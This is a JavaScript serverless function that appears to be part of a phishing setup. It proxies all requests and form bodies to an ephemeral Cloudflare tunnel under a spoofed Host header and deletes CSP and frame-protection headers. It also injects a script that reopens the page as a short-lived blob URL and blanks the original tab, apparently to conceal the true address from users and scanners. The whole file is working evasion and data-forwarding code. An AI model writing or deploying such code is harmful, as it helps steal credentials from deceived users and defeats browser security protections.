export async function onRequest(context) {
  const incomingUrl = new URL(context.request.url)

  // Serve clean HTML for the blob fetch (no script injection)
  if (incomingUrl.searchParams.get('_src') === '1') {
    const cleanUrl = new URL("https://experiment-cultures-unexpected-sympathy.trycloudflare.com")
    cleanUrl.pathname = incomingUrl.pathname || ""
    const headers = new Headers(context.request.headers)
    headers.set("host", "6c642c4f7a9fbc4c1939eccc19418e91.loophole.site")
    const res = await fetch(cleanUrl.toString(), {
      method: context.request.method,
      headers,
      body: context.request.body
    })
    return res
  }

  const target = new URL("https://experiment-cultures-unexpected-sympathy.trycloudflare.com")
  target.pathname = incomingUrl.pathname || ""
  target.search = incomingUrl.search

  const headers = new Headers(context.request.headers)
  headers.set("host", "6c642c4f7a9fbc4c1939eccc19418e91.loophole.site")

  const response = await fetch(target.toString(), {
    method: context.request.method,
    headers,
    body: context.request.body
  })

  const contentType = response.headers.get("content-type") || ""
  if (!contentType.includes("text/html")) return response

  let html = await response.text()

  const cleanUrl = incomingUrl.origin + incomingUrl.pathname + '?_src=1'

  const script = `
<script>
  (function() {
    // Fetch a clean copy of the page (no injected script)
    fetch('${cleanUrl}')
      .then(r => r.text())
      .then(pageHtml => {
        // Create blob from clean HTML
        const blob = new Blob([pageHtml], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);

        // Open blob in new tab
        window.open(blobUrl, '_blank');

        // Revoke after short delay so blob URL dies
        setTimeout(() => URL.revokeObjectURL(blobUrl), 3000);

        // Wipe original tab from history and navigate away
        history.replaceState(null, '', location.href);
        location.replace('about:blank');
      });
  })();
<\/script>`

  if (/<\/head>/i.test(html)) {
    html = html.replace(/<\/head>/i, script + '</head>')
  } else {
    html = script + html
  }

  const newHeaders = new Headers(response.headers)
  newHeaders.delete("content-security-policy")
  newHeaders.delete("content-security-policy-report-only")
  newHeaders.delete("x-frame-options")
  newHeaders.set("content-type", "text/html; charset=utf-8")

  return new Response(html, {
    status: response.status,
    headers: newHeaders
  })
}
